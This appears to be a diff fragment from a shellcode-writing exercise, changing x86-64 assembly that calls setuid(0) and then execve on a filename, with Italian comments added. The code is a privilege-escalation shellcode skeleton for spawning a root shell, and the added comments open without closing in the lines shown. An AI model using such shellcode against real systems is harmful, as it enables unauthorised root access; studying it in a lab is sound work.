@@ -12,11 +12,11 @@ execution, your shellcode will need to be *position-independent*.
 .global _start
 _start: 
 .intel_syntax noprefix
-	mov rax, 0x69	
+	mov rax, 0x69	/* modifico il setuid 
 	mov rdi, 0
 	syscall 
 	
-	mov rax, 0x3b 		
+	mov rax, 59		 /*exec
 	lea rdi, [rip+filename]
 	mov rsi, 0
 	mov rdx, 0
